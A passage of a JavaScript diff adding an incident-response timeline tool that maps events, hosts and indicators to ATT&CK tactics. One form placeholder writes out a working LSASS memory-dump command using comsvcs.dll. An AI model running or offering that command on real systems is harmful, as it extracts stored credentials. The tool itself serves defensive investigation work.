+   ['T1087','Account Discovery'],['T1087.002','Domain Account'],['T1082','System Information Discovery'],
+   ['T1083','File and Directory Discovery'],['T1018','Remote System Discovery'],
+   ['T1046','Network Service Discovery'],['T1057','Process Discovery'],
+   ['T1016','System Network Configuration Discovery'],['T1049','System Network Connections Discovery'],
+   ['T1069','Permission Groups Discovery'],['T1069.002','Domain Groups'],['T1482','Domain Trust Discovery'],
+   ['T1033','System Owner/User Discovery'],['T1518','Software Discovery'],
+   ['T1518.001','Security Software Discovery'],['T1135','Network Share Discovery'],['T1201','Password Policy Discovery']]},
+ {id:'TA0008',name:'Lateral Movement',short:'LATERAL',color:'#00d1b8',tech:[
+   ['T1021','Remote Services'],['T1021.001','Remote Desktop Protocol'],['T1021.002','SMB/Windows Admin Shares'],
+   ['T1021.004','SSH'],['T1021.006','Windows Remote Management'],['T1570','Lateral Tool Transfer'],
+   ['T1550','Use Alternate Authentication Material'],['T1550.002','Pass the Hash'],['T1550.003','Pass the Ticket'],
+   ['T1210','Exploitation of Remote Services'],['T1080','Taint Shared Content'],
+   ['T1563','Remote Service Session Hijacking'],['T1072','Software Deployment Tools']]},
+ {id:'TA0009',name:'Collection',short:'COLLECT',color:'#a0d911',tech:[
+   ['T1005','Data from Local System'],['T1039','Data from Network Shared Drive'],
+   ['T1074','Data Staged'],['T1074.001','Local Data Staging'],['T1074.002','Remote Data Staging'],
+   ['T1560','Archive Collected Data'],['T1560.001','Archive via Utility'],
+   ['T1113','Screen Capture'],['T1114','Email Collection'],['T1056.001','Keylogging'],
+   ['T1119','Automated Collection'],['T1213','Data from Information Repositories']]},
+ {id:'TA0011',name:'Command and Control',short:'C2',color:'#ff2ed4',tech:[
+   ['T1071','Application Layer Protocol'],['T1071.001','Web Protocols'],['T1071.004','DNS'],
+   ['T1105','Ingress Tool Transfer'],['T1573','Encrypted Channel'],['T1573.002','Asymmetric Cryptography'],
+   ['T1090','Proxy'],['T1090.003','Multi-hop Proxy'],['T1219','Remote Access Software'],
+   ['T1572','Protocol Tunneling'],['T1568','Dynamic Resolution'],['T1568.002','Domain Generation Algorithms'],
+   ['T1102','Web Service'],['T1095','Non-Application Layer Protocol'],['T1008','Fallback Channels'],
+   ['T1132','Data Encoding']]},
+ {id:'TA0010',name:'Exfiltration',short:'EXFIL',color:'#ff8c00',tech:[
+   ['T1041','Exfiltration Over C2 Channel'],['T1048','Exfiltration Over Alternative Protocol'],
+   ['T1048.003','Exfiltration Over Unencrypted Non-C2 Protocol'],
+   ['T1567','Exfiltration Over Web Service'],['T1567.002','Exfiltration to Cloud Storage'],
+   ['T1029','Scheduled Transfer'],['T1030','Data Transfer Size Limits'],
+   ['T1052','Exfiltration Over Physical Medium'],['T1011','Exfiltration Over Other Network Medium']]},
+ {id:'TA0040',name:'Impact',short:'IMPACT',color:'#ff1f3d',tech:[
+   ['T1486','Data Encrypted for Impact'],['T1490','Inhibit System Recovery'],['T1489','Service Stop'],
+   ['T1485','Data Destruction'],['T1491','Defacement'],['T1498','Network Denial of Service'],
+   ['T1499','Endpoint Denial of Service'],['T1531','Account Access Removal'],
+   ['T1565','Data Manipulation'],['T1496','Resource Hijacking'],['T1561','Disk Wipe'],['T1657','Financial Theft']]}
+];
+const TAC_BY_ID = {}; TACTICS.forEach(t=>TAC_BY_ID[t.id]=t);
+const TECH_NAME = {}; TACTICS.forEach(t=>t.tech.forEach(p=>TECH_NAME[p[0]]=p[1]));
+
+const IOC_TYPES = ['ip','domain','url','sha256','sha1','md5','filepath','filename','registry','email',
+  'useraccount','process','service','mutex','port','cve','certificate','user-agent','other'];
+
+const PRIVS = ['standard user','local admin','domain user','domain admin','enterprise admin','SYSTEM',
+  'service account','root','sudo','machine account','unknown'];
+
+const CONFIDENCE = [
+  {id:'confirmed',label:'Confirmed',color:'#4dff9a'},
+  {id:'high',label:'High',color:'#22e8ff'},
+  {id:'medium',label:'Medium',color:'#ffb020'},
+  {id:'low',label:'Low',color:'#9d6bff'},
+  {id:'suspected',label:'Suspected',color:'#6d8299'}
+];
+const CONF_BY_ID = {}; CONFIDENCE.forEach(c=>CONF_BY_ID[c.id]=c);
+
+const SEVERITY = [
+  {id:'critical',label:'Critical',color:'#ff1f3d'},
+  {id:'high',label:'High',color:'#ff6b3d'},
+  {id:'medium',label:'Medium',color:'#ffb020'},
+  {id:'low',label:'Low',color:'#22e8ff'},
+  {id:'info',label:'Info',color:'#6d8299'}
+];
+const SEV_BY_ID = {}; SEVERITY.forEach(s=>SEV_BY_ID[s.id]=s);
+
+const HOST_STATUS = [
+  {id:'compromised',label:'Compromised',color:'#ff1f3d'},
+  {id:'suspect',label:'Suspect',color:'#ffb020'},
+  {id:'contained',label:'Contained',color:'#9d6bff'},
+  {id:'remediated',label:'Remediated',color:'#4dff9a'},
+  {id:'clean',label:'Clean',color:'#22e8ff'},
+  {id:'unknown',label:'Unknown',color:'#6d8299'}
+];
+const HS_BY_ID = {}; HOST_STATUS.forEach(s=>HS_BY_ID[s.id]=s);
+
+const CRITICALITY = ['crown jewel','high','moderate','low'];
+
+const DATA_SOURCES = ['EDR','Splunk','Microsoft Sentinel','Elastic','QRadar','Chronicle','Windows Event Log',
+  'Sysmon','Firewall','Proxy','Zeek','NetFlow','DNS logs','Email gateway','Cloud audit log','VPN log',
+  'Memory image','Disk image','MFT','Prefetch','Registry hive','Interview','Other'];
+
+const LANE_COLORS = ['#22e8ff','#ff2e88','#4dff9a','#ffb020','#9d6bff','#00d1b8','#ff6b3d','#5b8dff',
+  '#ff2ed4','#a0d911','#ff4d5e','#00a6ff'];
+
+const TZ_OPTIONS = [
+  ['local','Local (this browser)'],['0','UTC ±00:00'],
+  ['-720','UTC −12:00'],['-660','UTC −11:00'],['-600','UTC −10:00'],['-540','UTC −09:00'],
+  ['-480','UTC −08:00 PST'],['-420','UTC −07:00 MST/PDT'],['-360','UTC −06:00 CST/MDT'],
+  ['-300','UTC −05:00 EST/CDT'],['-240','UTC −04:00 EDT'],['-210','UTC −03:30'],['-180','UTC −03:00'],
+  ['-120','UTC −02:00'],['-60','UTC −01:00'],
+  ['60','UTC +01:00 CET'],['120','UTC +02:00 CEST'],['180','UTC +03:00'],['210','UTC +03:30'],
+  ['240','UTC +04:00'],['270','UTC +04:30'],['300','UTC +05:00'],['330','UTC +05:30 IST'],
+  ['345','UTC +05:45'],['360','UTC +06:00'],['420','UTC +07:00'],['480','UTC +08:00'],
+  ['540','UTC +09:00 JST'],['570','UTC +09:30'],['600','UTC +10:00'],['660','UTC +11:00'],
+  ['720','UTC +12:00'],['780','UTC +13:00']
+];
+/* ============================ STATE ============================ */
+const SCHEMA = 'blackbox.case.v1';
+var S = blankCase();
+var UI = {view:'graph', tz:'utc', sel:null, expanded:{}, gmode:'seq', laneAll:false,
+  filters:{q:'',host:'',user:'',tactic:'',conf:[],flags:[],from:'',to:''}, dirty:false};
+
+function blankCase(){
+  return {schema:SCHEMA, generator:'BLACKBOX', hosts:[], events:[],
+    case:{name:'', number:'', analyst:'', classification:'', summary:'',
+          created:new Date().toISOString(), modified:new Date().toISOString()}};
+}
+
+/* ============================ UTIL ============================ */
+const $ = s=>document.querySelector(s);
+const $$ = s=>Array.prototype.slice.call(document.querySelectorAll(s));
+const uid = p=>p+'_'+Math.random().toString(36).slice(2,9)+Date.now().toString(36).slice(-3);
+function esc(s){return String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
+function attr(s){return esc(s).replace(/\n/g,'&#10;');}
+function trunc(s,n){s=String(s==null?'':s);return s.length>n?s.slice(0,n-1)+'…':s;}
+function pad(n,w){n=String(n);while(n.length<(w||2))n='0'+n;return n;}
+function dirty(on){UI.dirty=on!==false;$('#dirtyFlag').classList.toggle('on',UI.dirty);if(UI.dirty)S.case.modified=new Date().toISOString();}
+
+function toast(msg,kind){
+  const d=document.createElement('div');
+  d.className='toast'+(kind?' '+kind:'');
+  d.textContent=msg;
+  $('#toasts').appendChild(d);
+  setTimeout(()=>{d.style.transition='.3s';d.style.opacity='0';setTimeout(()=>d.remove(),320);},3000);
+}
+
+/* ------------------------- TIME ------------------------- */
+/* Events store `ts` as an ISO-8601 UTC string and `off` as the source-timezone
+   offset in minutes east of UTC, so a timestamp can always be re-rendered
+   the way the analyst originally saw it in the source system. */
+function browserOffset(ms){return -new Date(ms==null?Date.now():ms).getTimezoneOffset();}
+
+function parseTimestamp(raw, offMin){
+  if(!raw) return null;
+  let s=String(raw).trim().replace(/\s*\(.*\)$/,'').replace(/^"|"$/g,'');
+  if(!s) return null;
+  if(/^\d{13}$/.test(s)) return new Date(+s).toISOString();
+  if(/^\d{10}$/.test(s)) return new Date(+s*1000).toISOString();
+  // explicit zone in the string wins over the picker
+  if(/(Z|[+-]\d{2}:?\d{2})$/i.test(s)){
+    const t=Date.parse(s.replace(' ','T'));
+    if(!isNaN(t)) return new Date(t).toISOString();
+  }
+  let m=s.match(/^(\d{4})[-/.](\d{1,2})[-/.](\d{1,2})(?:[ T]+(\d{1,2}):(\d{2})(?::(\d{2}))?(?:[.,](\d{1,6}))?)?$/);
+  if(!m){
+    const u=s.match(/^(\d{1,2})[/-](\d{1,2})[/-](\d{4})(?:[ ,T]+(\d{1,2}):(\d{2})(?::(\d{2}))?)?\s*(AM|PM)?$/i);
+    if(u){
+      let h=+(u[4]||0);
+      if(u[7]){const ap=u[7].toUpperCase();if(ap==='PM'&&h<12)h+=12;if(ap==='AM'&&h===12)h=0;}
+      m=[null,u[3],u[1],u[2],String(h),u[5]||'0',u[6]||'0','0'];
+    }
+  }
+  if(!m) return null;
+  const ms=Date.UTC(+m[1],+m[2]-1,+m[3],+(m[4]||0),+(m[5]||0),+(m[6]||0),+((m[7]||'0')+'00').slice(0,3));
+  if(isNaN(ms)) return null;
+  const off = offMin==='local'? browserOffset(ms) : (+offMin||0);
+  return new Date(ms-off*60000).toISOString();
+}
+
+function offsetLabel(min){
+  if(min===0||min==null) return 'UTC';
+  const s=min<0?'−':'+', a=Math.abs(min);
+  return 'UTC'+s+pad(Math.floor(a/60))+':'+pad(a%60);
+}
+function fmtParts(epoch, offMin){
+  const d=new Date(epoch+offMin*60000);
+  return {date:d.getUTCFullYear()+'-'+pad(d.getUTCMonth()+1)+'-'+pad(d.getUTCDate()),
+          time:pad(d.getUTCHours())+':'+pad(d.getUTCMinutes())+':'+pad(d.getUTCSeconds())};
+}
+function evOffset(ev){
+  if(UI.tz==='utc') return 0;
+  if(UI.tz==='local') return browserOffset(ev.ep);
+  return +ev.off||0;
+}
+function fmtTs(ev,withZone){
+  const off=evOffset(ev), p=fmtParts(ev.ep,off);
+  return p.date+' '+p.time+(withZone?' '+offsetLabel(off):'');
+}
+function fmtDate(ev){return fmtParts(ev.ep,evOffset(ev)).date;}
+function fmtTime(ev){return fmtParts(ev.ep,evOffset(ev)).time;}
+function isoInput(ev){ // value for the timestamp box, in the event's own source zone
+  const p=fmtParts(ev.ep,+ev.off||0); return p.date+' '+p.time;
+}
+function humanSpan(ms){
+  if(ms<0||!isFinite(ms)) return '—';
+  const m=Math.floor(ms/60000), h=Math.floor(m/60), d=Math.floor(h/24);
+  if(d>0) return d+'d '+(h%24)+'h';
+  if(h>0) return h+'h '+(m%60)+'m';
+  if(m>0) return m+'m';
+  return Math.round(ms/1000)+'s';
+}
+
+/* ------------------------- LOOKUPS ------------------------- */
+function host(id){return S.hosts.find(h=>h.id===id)||null;}
+function hostName(id){const h=host(id);return h?h.name:'—';}
+function hostLabel(id){const h=host(id);if(!h)return '—';return h.name+(h.ip?' · '+h.ip:'');}
+function laneColor(id){const i=S.hosts.findIndex(h=>h.id===id);return LANE_COLORS[(i<0?0:i)%LANE_COLORS.length];}
+function tacticOf(ev){return ev.tactic?TAC_BY_ID[ev.tactic]:null;}
+function techLabel(ev){
+  if(!ev.technique) return '';
+  const n=TECH_NAME[ev.technique];
+  return ev.technique+(n?' '+n:'');
+}
+function decorate(){ // cache epoch + sort
+  S.events.forEach(e=>{e.ep=Date.parse(e.ts);if(isNaN(e.ep))e.ep=0;});
+  S.events.sort((a,b)=>a.ep-b.ep || String(a.id).localeCompare(String(b.id)));
+}
+
+/* ------------------------- FILTERING ------------------------- */
+function filtered(){
+  const f=UI.filters;
+  const q=f.q.trim().toLowerCase();
+  const from=f.from?Date.parse(parseTimestamp(f.from,0)||''):NaN;
+  const to=f.to?Date.parse(parseTimestamp(f.to.length<=10?f.to+' 23:59:59':f.to,0)||''):NaN;
+  return S.events.filter(e=>{
+    if(f.host && e.hostId!==f.host && e.srcHostId!==f.host) return false;
+    if(f.user && (e.user||'')!==f.user) return false;
+    if(f.tactic && e.tactic!==f.tactic) return false;
+    if(f.conf.length && f.conf.indexOf(e.conf||'')<0) return false;
+    if(f.flags.indexOf('key')>=0 && !e.key) return false;
+    if(f.flags.indexOf('pivot')>=0 && !(e.srcHostId && e.srcHostId!==e.hostId)) return false;
+    if(f.flags.indexOf('linked')>=0 && !e.link) return false;
+    if(!isNaN(from) && e.ep<from) return false;
+    if(!isNaN(to) && e.ep>to) return false;
+    if(q){
+      const hay=[e.indicator,e.itype,e.activity,e.cmd,e.user,e.priv,e.notes,e.source,e.evidence,
+        e.technique,TECH_NAME[e.technique],hostName(e.hostId),hostName(e.srcHostId),
+        (e.tags||[]).join(' '),(TAC_BY_ID[e.tactic]||{}).name].join(' ').toLowerCase();
+      if(hay.indexOf(q)<0) return false;
+    }
+    return true;
+  });
+}
+
+/* ------------------------- HOST AGGREGATION ------------------------- */
+function hostAgg(id){
+  const evs=S.events.filter(e=>e.hostId===id);
+  const inb=S.events.filter(e=>e.srcHostId===id && e.hostId!==id);
+  const users={}, tactics={}, iocs={};
+  evs.forEach(e=>{
+    if(e.user) users[e.user]=(users[e.user]||0)+1;
+    if(e.tactic) tactics[e.tactic]=(tactics[e.tactic]||0)+1;
+    if(e.indicator) iocs[e.indicator]=1;
+  });
+  return {events:evs, count:evs.length, outbound:inb.length,
+    first:evs.length?evs[0].ep:null, last:evs.length?evs[evs.length-1].ep:null,
+    users:Object.keys(users), tactics:Object.keys(tactics), iocs:Object.keys(iocs).length};
+}
+
+/* ============================ MODALS ============================ */
+let onEsc=null;
+function closeModal(){$('#modalRoot').innerHTML='';onEsc=null;}
+function openModal(html,cls){
+  $('#modalRoot').innerHTML='<div class="overlay" id="ovl"><div class="modal '+(cls||'')+'">'+html+'</div></div>';
+  $('#ovl').addEventListener('mousedown',e=>{if(e.target.id==='ovl')closeModal();});
+  onEsc=closeModal;
+  const f=$('#modalRoot').querySelector('input,select,textarea');
+  if(f) setTimeout(()=>f.focus(),30);
+}
+function confirmBox(title,msg,okLabel,fn,danger){
+  openModal(
+    '<div class="mhead"><h3>'+esc(title)+'</h3></div>'+
+    '<div class="mbody"><p style="margin:0;color:var(--ink);line-height:1.7">'+msg+'</p></div>'+
+    '<div class="mfoot"><span class="sp"></span>'+
+    '<button class="btn ghost" id="cxNo">Cancel</button>'+
+    '<button class="btn '+(danger?'mag':'pri')+'" id="cxYes">'+esc(okLabel)+'</button></div>','narrow');
+  $('#cxNo').onclick=closeModal;
+  $('#cxYes').onclick=()=>{closeModal();fn();};
+}
+
+function selOpts(list,cur,valKey,lblKey){
+  return list.map(o=>{
+    const v=valKey?o[valKey]:(Array.isArray(o)?o[0]:o);
+    const l=lblKey?o[lblKey]:(Array.isArray(o)?o[1]:o);
+    return '<option value="'+attr(v)+'"'+(String(cur)===String(v)?' selected':'')+'>'+esc(l)+'</option>';
+  }).join('');
+}
+function hostOpts(cur,blank){
+  return '<option value="">'+(blank||'— none —')+'</option>'+
+    S.hosts.map(h=>'<option value="'+attr(h.id)+'"'+(h.id===cur?' selected':'')+'>'+esc(h.name)+(h.ip?' ('+esc(h.ip)+')':'')+'</option>').join('');
+}
+function techOpts(tacticId,cur){
+  const t=TAC_BY_ID[tacticId];
+  let list = t? t.tech : [];
+  let out='<option value="">— none —</option>'+list.map(p=>'<option value="'+p[0]+'"'+(p[0]===cur?' selected':'')+'>'+p[0]+' · '+esc(p[1])+'</option>').join('');
+  if(cur && list.every(p=>p[0]!==cur)) out+='<option value="'+attr(cur)+'" selected>'+esc(cur)+(TECH_NAME[cur]?' · '+esc(TECH_NAME[cur]):'')+'</option>';
+  return out;
+}
+
+/* ------------------------- EVENT EDITOR ------------------------- */
+function editEvent(id,draft){
+  const isNew=!id;
+  const prev=S.events.length?S.events[S.events.length-1]:null;
+  let e = isNew ? {id:uid('ev'), ts:new Date().toISOString(), off:0, hostId:(prev?prev.hostId:(S.hosts[0]||{}).id)||'',
+      srcHostId:'', user:'', priv:'', indicator:'', itype:'', activity:'', cmd:'', tactic:'', technique:'',
+      source:'', link:'', conf:'medium', sev:'medium', key:false, tags:[], evidence:'', notes:''}
+    : Object.assign({}, S.events.find(x=>x.id===id));
+  if(draft) e = Object.assign({}, e, draft, {id:e.id});
+  if(!e.ts) e.ts=new Date().toISOString();
+  e.ep=Date.parse(e.ts);
+
+  openModal(
+  '<div class="mhead"><h3>'+(isNew?'Add event':'Edit event')+'</h3>'+
+    (isNew?'':'<button class="btn sm ghost" id="evDup">Duplicate</button><button class="btn sm mag" id="evDel">Delete</button>')+
+    '<button class="btn sm ghost" id="evX">✕</button></div>'+
+  '<div class="mbody">'+
+    '<fieldset class="fs"><legend>When</legend><div class="grid3">'+
+      '<div class="field span2"><label for="eTs">Timestamp</label>'+
+        '<div class="inline"><input type="text" id="eTs" value="'+attr(isoInput(e))+'" placeholder="2026-07-14 13:02:41">'+
+        '<button class="btn sm" id="eNow">Now</button></div>'+
+        '<div class="hint">ISO, <span>YYYY-MM-DD HH:MM:SS</span>, US format, or epoch seconds/ms</div>'+
+        '<div class="err" id="eTsErr"></div></div>'+
+      '<div class="field"><label for="eOff">Source timezone</label><select id="eOff">'+
+        selOpts(TZ_OPTIONS,String(e.off))+'</select>'+
+        '<div class="hint">How the source system logged it</div></div>'+
+    '</div></fieldset>'+
+
+    '<fieldset class="fs"><legend>Where &amp; who</legend><div class="grid3">'+
+      '<div class="field"><label for="eHost">Host / target</label><select id="eHost">'+hostOpts(e.hostId,'— unassigned —')+'</select>'+
+        '<div class="hint"><a href="#" id="eAddHost" class="src">+ add a new host</a></div></div>'+
+      '<div class="field"><label for="eSrc">Came from (pivot source)</label><select id="eSrc">'+hostOpts(e.srcHostId,'— not a pivot —')+'</select>'+
+        '<div class="hint">Draws a branch in the graph</div></div>'+
+      '<div class="field"><label for="eUser">Account</label><input type="text" id="eUser" value="'+attr(e.user)+'" placeholder="CORP\\j.reyes" list="dlUsers"></div>'+
+      '<div class="field"><label for="ePriv">Privilege</label><input type="text" id="ePriv" value="'+attr(e.priv)+'" list="dlPriv" placeholder="domain admin"></div>'+
+      '<div class="field span2"><label for="eAct">Activity</label><input type="text" id="eAct" value="'+attr(e.activity)+'" placeholder="LSASS memory dumped via comsvcs.dll"></div>'+
+      '<div class="field span3"><label for="eCmd">Command line / raw detail</label><textarea id="eCmd" placeholder="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\ProgramData\\lsass.dmp full">'+esc(e.cmd)+'</textarea></div>'+
+    '</div></fieldset>'+
+
+    '<fieldset class="fs"><legend>Indicator</legend><div class="grid3">'+
+      '<div class="field"><label for="eIType">Type</label><input type="text" id="eIType" value="'+attr(e.itype)+'" list="dlIoc" placeholder="sha256"></div>'+
+      '<div class="field span2"><label for="eInd">Value</label><input type="text" id="eInd" value="'+attr(e.indicator)+'" placeholder="185.243.115.44"></div>'+
+    '</div></fieldset>'+
+
+    '<fieldset class="fs"><legend>Classification</legend><div class="grid3">'+
+      '<div class="field"><label for="eTac">Tactic</label><select id="eTac"><option value="">— none —</option>'+
+        TACTICS.map(t=>'<option value="'+t.id+'"'+(t.id===e.tactic?' selected':'')+'>'+t.id+' · '+esc(t.name)+'</option>').join('')+'</select></div>'+
+      '<div class="field span2"><label for="eTech">Technique</label><select id="eTech">'+techOpts(e.tactic,e.technique)+'</select></div>'+
+      '<div class="field"><label for="eConf">Confidence</label><select id="eConf">'+selOpts(CONFIDENCE,e.conf,'id','label')+'</select></div>'+
+      '<div class="field"><label for="eSev">Severity</label><select id="eSev">'+selOpts(SEVERITY,e.sev,'id','label')+'</select></div>'+
+      '<div class="field"><label for="eTags">Tags</label><input type="text" id="eTags" value="'+attr((e.tags||[]).join(', '))+'" placeholder="ransomware, patient-zero"></div>'+
+    '</div></fieldset>'+
+
+    '<fieldset class="fs"><legend>Evidence</legend><div class="grid3">'+
+      '<div class="field"><label for="eSource">Data source</label><input type="text" id="eSource" value="'+attr(e.source)+'" list="dlSrc" placeholder="Splunk"></div>'+
+      '<div class="field span2"><label for="eLink">Link to source record</label><input type="url" id="eLink" value="'+attr(e.link)+'" placeholder="https://splunk.corp/app/search/…"></div>'+
+      '<div class="field span3"><label for="eEvid">Evidence reference</label><input type="text" id="eEvid" value="'+attr(e.evidence)+'" placeholder="EVID-014 · triage collection WKS-FIN-014 2026-07-15"></div>'+
+      '<div class="field span3"><label for="eNotes">Analyst notes</label><textarea id="eNotes" placeholder="Why this matters, what is still unverified, follow-up needed…">'+esc(e.notes)+'</textarea></div>'+
+      '<div class="field span3"><label class="ck"><input type="checkbox" id="eKey"'+(e.key?' checked':'')+'> Flag as a key event in the attack narrative</label></div>'+
+    '</div></fieldset>'+
+  '</div>'+
+  '<div class="mfoot"><span class="sp"></span><button class="btn ghost" id="eCancel">Cancel</button>'+
+    '<button class="btn pri" id="eSave">'+(isNew?'Add event':'Save changes')+'</button></div>');
+
+  $('#evX')&&($('#evX').onclick=closeModal);
+  $('#eCancel').onclick=closeModal;
+  $('#eNow').onclick=()=>{const off=$('#eOff').value;const o=off==='local'?browserOffset():(+off||0);
+    const p=fmtParts(Date.now(),o);$('#eTs').value=p.date+' '+p.time;};
+  $('#eTac').onchange=()=>{$('#eTech').innerHTML=techOpts($('#eTac').value,'');};
+  $('#eAddHost').onclick=ev=>{ev.preventDefault();
+    const keep=readEventForm(e);
+    editHost(null,newId=>{keep.hostId=newId;editEvent(isNew?null:e.id,keep);});};
+  if($('#evDel')) $('#evDel').onclick=()=>{closeModal();deleteEvent(e.id);};
+  if($('#evDup')) $('#evDup').onclick=()=>{const c=readEventForm(e);delete c.id;editEvent(null,c);};
+  $('#eSave').onclick=()=>{
+    const v=readEventForm(e);
+    if(!v.ts){$('#eTsErr').textContent='Timestamp not recognised — try 2026-07-14 13:02:41';return;}
+    if(isNew) S.events.push(v); else {const i=S.events.findIndex(x=>x.id===e.id);S.events[i]=v;}
+    closeModal();dirty();UI.sel=v.id;renderAll();
+    toast(isNew?'Event added':'Event updated');
+  };
+}
+function readEventForm(base){
+  const offRaw=$('#eOff').value;
+  const off = offRaw==='local' ? browserOffset() : (+offRaw||0);
+  const ts = parseTimestamp($('#eTs').value, offRaw);
+  return Object.assign({},base,{
+    ts:ts||'', off:off,
+    hostId:$('#eHost').value, srcHostId:$('#eSrc').value,
+    user:$('#eUser').value.trim(), priv:$('#ePriv').value.trim(),
+    activity:$('#eAct').value.trim(), cmd:$('#eCmd').value,
+    itype:$('#eIType').value.trim(), indicator:$('#eInd').value.trim(),
+    tactic:$('#eTac').value, technique:$('#eTech').value,
+    conf:$('#eConf').value, sev:$('#eSev').value,
+    tags:$('#eTags').value.split(',').map(s=>s.trim()).filter(Boolean),
+    source:$('#eSource').value.trim(), link:$('#eLink').value.trim(),
+    evidence:$('#eEvid').value.trim(), notes:$('#eNotes').value,
+    key:$('#eKey').checked, ep:ts?Date.parse(ts):0
+  });
+}
+function deleteEvent(id){
+  const e=S.events.find(x=>x.id===id); if(!e) return;
+  confirmBox('Delete event','Remove <b>'+esc(trunc(e.activity||e.indicator||'this event',60))+'</b> from the timeline? This cannot be undone.','Delete',()=>{
+    S.events=S.events.filter(x=>x.id!==id);
+    if(UI.sel===id) UI.sel=null;
+    dirty();renderAll();toast('Event deleted','warn');
+  },true);
+}
+
+/* ------------------------- HOST EDITOR ------------------------- */
+function editHost(id,after){
+  const isNew=!id;
+  const h = isNew ? {id:uid('h'), name:'', ip:'', os:'', role:'', zone:'', crit:'moderate',
+      status:'suspect', owner:'', tags:[], notes:''}
+    : Object.assign({}, S.hosts.find(x=>x.id===id));
+  openModal(
+  '<div class="mhead"><h3>'+(isNew?'Add host':'Edit host')+'</h3>'+
+    (isNew?'':'<button class="btn sm mag" id="hDel">Delete</button>')+
+    '<button class="btn sm ghost" id="hX">✕</button></div>'+
+  '<div class="mbody"><div class="grid3">'+
+    '<div class="field"><label for="hName">Hostname</label><input type="text" id="hName" value="'+attr(h.name)+'" placeholder="WKS-FIN-014"></div>'+
+    '<div class="field"><label for="hIp">IP address(es)</label><input type="text" id="hIp" value="'+attr(h.ip)+'" placeholder="10.20.4.31"></div>'+
+    '<div class="field"><label for="hOs">Operating system</label><input type="text" id="hOs" value="'+attr(h.os)+'" placeholder="Windows 11 23H2"></div>'+
+    '<div class="field"><label for="hRole">Function</label><input type="text" id="hRole" value="'+attr(h.role)+'" placeholder="Finance workstation"></div>'+
+    '<div class="field"><label for="hZone">Network zone</label><input type="text" id="hZone" value="'+attr(h.zone)+'" placeholder="Corp / VLAN 20"></div>'+
+    '<div class="field"><label for="hOwner">Owner / custodian</label><input type="text" id="hOwner" value="'+attr(h.owner)+'" placeholder="J. Reyes, Finance"></div>'+
+    '<div class="field"><label for="hStatus">Status</label><select id="hStatus">'+selOpts(HOST_STATUS,h.status,'id','label')+'</select></div>'+
+    '<div class="field"><label for="hCrit">Business criticality</label><select id="hCrit">'+selOpts(CRITICALITY,h.crit)+'</select></div>'+
+    '<div class="field"><label for="hTags">Tags</label><input type="text" id="hTags" value="'+attr((h.tags||[]).join(', '))+'" placeholder="pci, isolated"></div>'+
+    '<div class="field span3"><label for="hNotes">Notes</label><textarea id="hNotes" placeholder="Containment actions, imaging status, open questions…">'+esc(h.notes)+'</textarea></div>'+
+  '</div></div>'+
+  '<div class="mfoot"><span class="sp"></span><button class="btn ghost" id="hCancel">Cancel</button>'+
+    '<button class="btn pri" id="hSave">'+(isNew?'Add host':'Save changes')+'</button></div>');
+
+  $('#hX').onclick=closeModal; $('#hCancel').onclick=closeModal;
+  if($('#hDel')) $('#hDel').onclick=()=>{closeModal();deleteHost(id);};
+  $('#hSave').onclick=()=>{
+    const v=Object.assign({},h,{
+      name:$('#hName').value.trim()||'UNNAMED-'+h.id.slice(-4),
+      ip:$('#hIp').value.trim(), os:$('#hOs').value.trim(), role:$('#hRole').value.trim(),
+      zone:$('#hZone').value.trim(), owner:$('#hOwner').value.trim(),
+      status:$('#hStatus').value, crit:$('#hCrit').value,
+      tags:$('#hTags').value.split(',').map(s=>s.trim()).filter(Boolean),
+      notes:$('#hNotes').value});
+    if(isNew) S.hosts.push(v); else {const i=S.hosts.findIndex(x=>x.id===id);S.hosts[i]=v;}
+    closeModal();dirty();renderAll();toast(isNew?'Host added':'Host updated');
+    if(after) after(v.id);
+  };
+}
+function deleteHost(id){
+  const h=host(id); if(!h) return;
+  const n=S.events.filter(e=>e.hostId===id||e.srcHostId===id).length;
+  confirmBox('Delete host','Remove <b>'+esc(h.name)+'</b>?'+(n?' <span style="color:var(--am)">'+n+' event(s) reference this host and will be left unassigned.</span>':''),'Delete',()=>{
+    S.hosts=S.hosts.filter(x=>x.id!==id);
+    S.events.forEach(e=>{if(e.hostId===id)e.hostId='';if(e.srcHostId===id)e.srcHostId='';});
+    dirty();renderAll();toast('Host deleted','warn');
+  },true);
+}
+
+/* ------------------------- CASE DETAILS ------------------------- */
+function editCase(){
+  const c=S.case;
+  openModal(
+  '<div class="mhead"><h3>Case details</h3><button class="btn sm ghost" id="cX">✕</button></div>'+
+  '<div class="mbody"><div class="grid2">'+
+    '<div class="field"><label for="cName">Investigation name</label><input type="text" id="cName" value="'+attr(c.name)+'" placeholder="Operation Glasshouse"></div>'+
+    '<div class="field"><label for="cNum">Case number</label><input type="text" id="cNum" value="'+attr(c.number)+'" placeholder="IR-2026-0142"></div>'+
+    '<div class="field"><label for="cAnalyst">Lead analyst</label><input type="text" id="cAnalyst" value="'+attr(c.analyst)+'"></div>'+
+    '<div class="field"><label for="cClass">Handling / classification</label><input type="text" id="cClass" value="'+attr(c.classification)+'" placeholder="TLP:AMBER+STRICT"></div>'+
+    '<div class="field span2"><label for="cSum">Executive summary</label><textarea id="cSum" style="min-height:130px" placeholder="What happened, scope, current status…">'+esc(c.summary)+'</textarea></div>'+
+  '</div></div>'+
+  '<div class="mfoot"><span class="sp"></span><button class="btn ghost" id="cCancel">Cancel</button><button class="btn pri" id="cSave">Save details</button></div>');
+  $('#cX').onclick=closeModal; $('#cCancel').onclick=closeModal;
+  $('#cSave').onclick=()=>{
+    c.name=$('#cName').value; c.number=$('#cNum').value; c.analyst=$('#cAnalyst').value;
+    c.classification=$('#cClass').value; c.summary=$('#cSum').value;
+    closeModal();dirty();renderAll();toast('Case details saved');
+  };
+}
+/* ============================ RENDER ============================ */
+function renderAll(){
+  decorate();
+  refreshDatalists();
+  $('#caseName').value=S.case.name||'';
+  $('#caseNumber').value=S.case.number||'';
+  renderSidebar();
+  const f=filtered();
+  $('#tabCountT').textContent=f.length;
+  $('#tabCountH').textContent=S.hosts.length;
+  $('#tabCountI').textContent=Object.keys(iocIndex(f)).length;
+  const v=UI.view;
+  if(v==='graph') renderGraph(f);
+  else if(v==='timeline') renderTimeline(f);
+  else if(v==='hosts') renderHosts();
+  else if(v==='pivot') renderPivot(f);
+  else if(v==='matrix') renderMatrix(f);
+  else if(v==='report') renderReport();
+}
+
+function renderSidebar(){
+  const evs=S.events;
+  $('#stEvents').textContent=evs.length;
